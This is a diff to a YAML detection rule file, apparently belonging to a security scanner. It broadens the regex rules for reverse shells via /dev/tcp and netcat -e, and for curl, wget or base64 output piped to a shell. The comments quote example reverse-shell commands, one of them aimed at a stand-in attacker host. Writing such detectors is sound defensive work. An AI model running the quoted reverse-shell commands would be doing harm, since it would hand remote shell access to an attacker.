@@ -8,13 +8,27 @@ rules:
     confidence: 0.98
     tags: [execution, reverse-shell]
   - id: CMD-REVSHELL-DEVTCP
-    pattern: '/dev/tcp/\d{1,3}\.\d{1,3}'
+    # Closes bash /dev/tcp also accepts hostnames
+    # (e.g. exec 5<>/dev/tcp/attacker.example/4444), so match either
+    # a dotted-quad IPv4 prefix OR a non-empty hostname-shaped token
+    # followed by `/<port>`. The hostname branch demands at least one
+    # `.` to keep precision (single-label local names like `host` are
+    # rare on real reverse-shell targets and would create FPs against
+    # benign /dev/tcp/<service> string fragments).
+    pattern: '/dev/tcp/(?:\d{1,3}\.\d{1,3}|[A-Za-z0-9-]+(?:\.[A-Za-z0-9-]+)+)/\d+\b'
     title: "Reverse shell via /dev/tcp"
     severity: CRITICAL
     confidence: 0.95
     tags: [execution, reverse-shell]
   - id: CMD-REVSHELL-NC
-    pattern: '(?i)\b(?:nc|ncat|netcat)\b\s+(?:-[a-zA-Z]*\s+)*\S+\s+\d+\s*(?:-e|--exec)'
+    # Closes matches BOTH netcat reverse-shell forms:
+    #   - destination-first:  nc 1.2.3.4 4444 -e /bin/sh
+    #   - flag-first:         nc -e /bin/sh 1.2.3.4 4444
+    # The non-capturing alternation lets either ordering trigger the
+    # CRITICAL rule. The `-e|--exec` branch on either side is the
+    # hard signal — netcat is rarely combined with -e/--exec for
+    # legitimate operations.
+    pattern: '(?i)\b(?:nc|ncat|netcat)\b\s+(?:(?:-[a-zA-Z]*\s+)*\S+\s+\d+\s*(?:-e|--exec)\b|(?:-[a-zA-Z]*\s+)*(?:-e|--exec)\s+\S+\s+\S+\s+\d+\b)'
     title: "Netcat reverse shell with -e"
     severity: CRITICAL
     confidence: 0.95
@@ -26,19 +40,24 @@ rules:
     confidence: 0.90
     tags: [execution, reverse-shell]
   - id: CMD-PIPE-CURL
-    pattern: '(?i)\bcurl\b\s+[^|]*\|\s*(?:ba)?sh\b'
+    # Closes (parity with strict/rules/commands.yaml):
+    # also match absolute shell paths like `/bin/sh`, `/bin/bash`,
+    # `/usr/bin/zsh`, plus the bare `sh` / `bash` / `zsh` forms.
+    pattern: '(?i)\bcurl\b\s+[^|]*\|\s*(?:[/\w]+/)?(?:bash|zsh|sh)\b'
     title: "curl piped to shell"
     severity: CRITICAL
     confidence: 0.95
     tags: [execution, download-exec]
   - id: CMD-PIPE-WGET
-    pattern: '(?i)\bwget\b\s+[^|]*\|\s*(?:ba)?sh\b'
+    # Closes (parity with CMD-PIPE-CURL above).
+    pattern: '(?i)\bwget\b\s+[^|]*\|\s*(?:[/\w]+/)?(?:bash|zsh|sh)\b'
     title: "wget piped to shell"
     severity: CRITICAL
     confidence: 0.95
     tags: [execution, download-exec]
   - id: CMD-PIPE-BASE64
-    pattern: '(?i)base64\s+(?:-[dD]|--decode)\s*\|\s*(?:ba)?sh\b'
+    # Closes (parity with CMD-PIPE-CURL above).
+    pattern: '(?i)base64\s+(?:-[dD]|--decode)\s*\|\s*(?:[/\w]+/)?(?:bash|zsh|sh)\b'
     title: "base64 decode piped to shell"
     severity: CRITICAL
     confidence: 0.95
